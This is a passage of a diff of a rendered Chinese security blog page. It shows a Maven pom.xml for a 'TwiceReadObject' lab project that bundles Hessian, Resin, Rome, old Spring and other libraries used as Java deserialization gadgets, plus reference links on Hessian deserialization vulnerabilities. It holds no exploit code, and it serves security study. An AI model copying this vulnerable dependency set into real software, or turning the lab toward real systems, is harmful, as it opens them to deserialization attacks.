+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;project</span> <span class=na>xmlns=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
+</span></span><span class=line><span class=cl>         <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class=line><span class=cl>         <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;modelVersion&gt;</span>4.0.0<span class=nt>&lt;/modelVersion&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;groupId&gt;</span>org.example<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;artifactId&gt;</span>TwiceReadObject<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;version&gt;</span>1.0-SNAPSHOT<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;properties&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;maven.compiler.source&gt;</span>8<span class=nt>&lt;/maven.compiler.source&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;maven.compiler.target&gt;</span>8<span class=nt>&lt;/maven.compiler.target&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class=nt>&lt;/project.build.sourceEncoding&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;spring.version&gt;</span>5.0.0.RELEASE<span class=nt>&lt;/spring.version&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/properties&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;dependencies&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>com.caucho<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>resin<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>4.0.64<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;exclusions&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;exclusion&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;groupId&gt;</span>com.caucho<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;artifactId&gt;</span>javaee-16<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/exclusion&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/exclusions&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>      
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.aspectj<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>aspectjweaver<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>1.9.7<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.aspectj<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>aspectjrt<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>1.9.7<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.javassist<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>javassist<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>3.28.0-GA<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>      
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.apache.xbean<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>xbean-naming<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>4.26<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>rome<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>rome<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>1.0<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>com.caucho<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>hessian<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>4.0.66<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.springframework<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>spring-aop<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${spring.version}<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.springframework<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>spring-context<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${spring.version}<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.springframework<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>spring-web<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${spring.version}<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.springframework<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>spring-webmvc<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${spring.version}<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>      
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>              <span class=nt>&lt;groupId&gt;</span>javax.servlet<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>              <span class=nt>&lt;artifactId&gt;</span>javax.servlet-api<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>              <span class=nt>&lt;version&gt;</span>4.0.1<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>              <span class=nt>&lt;scope&gt;</span>provided<span class=nt>&lt;/scope&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/dependencies&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;build&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;plugins&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;plugin&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;groupId&gt;</span>org.apache.maven.plugins<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;artifactId&gt;</span>maven-compiler-plugin<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;configuration&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;excludes&gt;</span>
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;exclude&gt;</span>org/example/resin/**<span class=nt>&lt;/exclude&gt;</span>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/excludes&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/configuration&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/plugin&gt;</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/plugins&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/build&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/project&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p><a class=link href=https://xz.aliyun.com/news/17603 target=_blank rel=noopener>https://xz.aliyun.com/news/17603</a></p><p><a class=link href=https://www.javasec.org/java-vuls/Hessian.html target=_blank rel=noopener>https://www.javasec.org/java-vuls/Hessian.html</a></p><p><a class=link href=https://changeyourway.github.io/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ target=_blank rel=noopener>https://changeyourway.github.io/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a class=link href=https://goodapple.top/archives/1193 target=_blank rel=noopener>https://goodapple.top/archives/1193</a></p></blockquote></section><footer class=article-footer><section class=article-tags></section><section class=article-references><div class=article-references__header><span class=article-references__icon><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 </span><span>参考阅读</span></div><ol class=article-references__list><li><a href=https://xz.aliyun.com/news/17603 target=_blank rel=noopener>https://xz.aliyun.com/news/17603</a></li><li><a href=https://www.javasec.org/java-vuls/Hessian.html target=_blank rel=noopener>https://www.javasec.org/java-vuls/Hessian.html</a></li><li><a href=https://changeyourway.github.io/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ target=_blank rel=noopener>https://changeyourway.github.io/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li><li><a href=https://goodapple.top/archives/1193 target=_blank rel=noopener>https://goodapple.top/archives/1193</a></li></ol></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
 <span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
 <span>Last updated on Nov 18, 2025 01:58 CST</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
 2024 -
-2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 379.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
+2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 381.9k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
